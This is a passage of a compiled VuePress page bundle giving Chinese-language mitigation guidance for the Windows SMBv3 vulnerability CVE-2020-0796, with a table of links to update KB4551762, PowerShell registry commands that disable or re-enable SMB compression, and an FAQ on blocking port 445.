"),t("tbody",[t("tr",[t("td",[s._v("Windows 10 Version 1903 for 32-bit Systems")]),s._v(" "),t("td",{staticStyle:{"text-align":"left"}},[t("a",{attrs:{href:"https://support.microsoft.com/help/4551762",target:"_blank",rel:"noopener noreferrer"}},[s._v("KB4551762介绍"),t("OutboundLink")],1)]),s._v(" "),t("td",{staticStyle:{"text-align":"center"}},[t("a",{attrs:{href:"https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4551762",target:"_blank",rel:"noopener noreferrer"}},[s._v("下载"),t("OutboundLink")],1)])]),s._v(" "),t("tr",[t("td",[s._v("Windows 10 Version 1903 for ARM64-based Systems")]),s._v(" "),t("td",{staticStyle:{"text-align":"left"}},[t("a",{attrs:{href:"https://support.microsoft.com/help/4551762",target:"_blank",rel:"noopener noreferrer"}},[s._v("KB4551762介绍"),t("OutboundLink")],1)]),s._v(" "),t("td",{staticStyle:{"text-align":"center"}},[t("a",{attrs:{href:"https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4551762",target:"_blank",rel:"noopener noreferrer"}},[s._v("下载"),t("OutboundLink")],1)])]),s._v(" "),t("tr",[t("td",[s._v("Windows 10 Version 1903 for x64-based Systems")]),s._v(" "),t("td",{staticStyle:{"text-align":"left"}},[t("a",{attrs:{href:"https://support.microsoft.com/help/4551762",target:"_blank",rel:"noopener noreferrer"}},[s._v("KB4551762介绍"),t("OutboundLink")],1)]),s._v(" "),t("td",{staticStyle:{"text-align":"center"}},[t("a",{attrs:{href:"https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4551762",target:"_blank",rel:"noopener noreferrer"}},[s._v("下载"),t("OutboundLink")],1)])]),s._v(" "),t("tr",[t("td",[s._v("Windows 10 Version 1909 for 32-bit Systems")]),s._v(" "),t("td",{staticStyle:{"text-align":"left"}},[t("a",{attrs:{href:"https://support.microsoft.com/help/4551762",target:"_blank",rel:"noopener noreferrer"}},[s._v("KB4551762介绍"),t("OutboundLink")],1)]),s._v(" "),t("td",{staticStyle:{"text-align":"center"}},[t("a",{attrs:{href:"https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4551762",target:"_blank",rel:"noopener noreferrer"}},[s._v("下载"),t("OutboundLink")],1)])]),s._v(" "),t("tr",[t("td",[s._v("Windows 10 Version 1909 for ARM64-based Systems")]),s._v(" "),t("td",{staticStyle:{"text-align":"left"}},[t("a",{attrs:{href:"https://support.microsoft.com/help/4551762",target:"_blank",rel:"noopener noreferrer"}},[s._v("KB4551762介绍"),t("OutboundLink")],1)]),s._v(" "),t("td",{staticStyle:{"text-align":"center"}},[t("a",{attrs:{href:"https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4551762",target:"_blank",rel:"noopener noreferrer"}},[s._v("下载"),t("OutboundLink")],1)])]),s._v(" "),t("tr",[t("td",[s._v("Windows 10 Version 1909 for x64-based Systems")]),s._v(" "),t("td",{staticStyle:{"text-align":"left"}},[t("a",{attrs:{href:"https://support.microsoft.com/help/4551762",target:"_blank",rel:"noopener noreferrer"}},[s._v("KB4551762介绍"),t("OutboundLink")],1)]),s._v(" "),t("td",{staticStyle:{"text-align":"center"}},[t("a",{attrs:{href:"https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4551762",target:"_blank",rel:"noopener noreferrer"}},[s._v("下载"),t("OutboundLink")],1)])]),s._v(" "),t("tr",[t("td",[s._v("Windows Server, version 1903 (Server Core installation)")]),s._v(" "),t("td",{staticStyle:{"text-align":"left"}},[t("a",{attrs:{href:"https://support.microsoft.com/help/4551762",target:"_blank",rel:"noopener noreferrer"}},[s._v("KB4551762介绍"),t("OutboundLink")],1)]),s._v(" "),t("td",{staticStyle:{"text-align":"center"}},[t("a",{attrs:{href:"https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4551762",target:"_blank",rel:"noopener noreferrer"}},[s._v("下载"),t("OutboundLink")],1)])]),s._v(" "),t("tr",[t("td",[s._v("Windows Server, version 1909 (Server Core installation)")]),s._v(" "),t("td",{staticStyle:{"text-align":"left"}},[t("a",{attrs:{href:"https://support.microsoft.com/help/4551762",target:"_blank",rel:"noopener noreferrer"}},[s._v("KB4551762介绍"),t("OutboundLink")],1)]),s._v(" "),t("td",{staticStyle:{"text-align":"center"}},[t("a",{attrs:{href:"https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4551762",target:"_blank",rel:"noopener noreferrer"}},[s._v("下载"),t("OutboundLink")],1)])])])]),s._v(" "),t("ul",[t("li",[s._v("禁用SMBv3压缩")])]),s._v(" "),t("p",[s._v("使用以下 PowerShell 命令禁用压缩以阻止未经身份验证的攻击者利用针对SMBv3 服务器的漏洞")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("Set-ItemProperty "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-Path")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters"')]),s._v(" DisableCompression "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-Type")]),s._v(" DWORD "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-Value")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-Force")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("解除这个限制")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[s._v("Set-ItemProperty "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-Path")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters"')]),s._v(" DisableCompression "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-Type")]),s._v(" DWORD "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-Value")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-Force")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[t("strong",[s._v("笔记：")])]),s._v(" "),t("ol",[t("li",[s._v("更改后无需重新启动。")]),s._v(" "),t("li",[t("strong",[s._v("此解决方法不能阻止 SMB 客户端的利用")])]),s._v(" "),t("li",[s._v("Windows 或 Windows Server 尚未使用 SMB 压缩，禁用 SMB 压缩不会对性能产生负面影响")])]),s._v(" "),t("p",[t("strong",[s._v("注意：")]),s._v(" 禁用解决方法后无需重新启动。")]),s._v(" "),t("h2",{attrs:{id:"常问问题"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#常问问题"}},[s._v("#")]),s._v(" 常问问题")]),s._v(" "),t("p",[t("strong",[s._v("我可以采取什么步骤来保护我的网络？")])]),s._v(" "),t("p",[t("strong",[s._v("在企业外围防火墙处阻止 TCP 端口 445")])]),s._v(" "),t("p",[s._v("TCP 端口 445 用于启动与受影响组件的连接。在网络外围防火墙处阻止此端口将有助于保护防火墙后面的系统免受利用此漏洞的攻击。这可以帮助保护网络免受来自企业外围之外的攻击。在企业外围处阻止受影响的端口是避免基于 Internet 的攻击的最佳防御措施。"),t("strong",[s._v("但是，系统仍然可能容易受到来自企业外围内部的攻击。")])]),s._v(" "),t("p",[t("strong",[s._v("旧版本的 Windows（安全更新表中未列出的版本，如win7,winxp,win server等）是否受此漏洞的影响？")])]),s._v(" "),t("p",[s._v("否，该漏洞存在于 Windows 10 版本 1903 中添加的新功能中。旧版本的 Windows 不支持 SMBv3.1.1 压缩，因此不受影响。")]),s._v(" "),t("p",[t("strong",[s._v("Windows Server 版本 1903（服务器核心安装）和 Windows Server 版本 1909（服务器核心安装）位于安全更新表中。非服务器核心安装的 Windows Server 版本 1903 和 Windows Server 版本 1909 是否受此漏洞影响？")])]),s._v(" "),t("p",[s._v("否。Windows Server 1903 和 1909 版本均在半年度频道 (SAC) 下发布。因此，只能安装服务器核心。")]),s._v(" "),t("p",[s._v("参考、致谢：")]),s._v(" "),t("ul",[t("li",[t("a",{attrs:{href:"https://www.cnblogs.com/kbhome/p/13073746.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("CVE-2020-0796（永恒之黑）漏洞利用getshell复现详细过程 "),t("OutboundLink")],1)]),s._v(" "),t("li",[t("a",{attrs:{href:"https://blog.csdn.net/qq_39120795/article/details/121410095",target:"_blank",rel:"noopener noreferrer"}},[s._v("CVE-2020-0796永恒之黑漏洞浅谈与利用"),t("OutboundLink")],1)]),s._v(" "),t("li",[t("a",{attrs:{href:"https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-0796",target:"_blank",rel:"noopener noreferrer"}},[s._v("微软 Windows SMBv3 客户端/服务器远程代码执行漏洞"),t("OutboundLink")],1)])])])}),[],!1,null,null,null);t.default=n.exports}}]);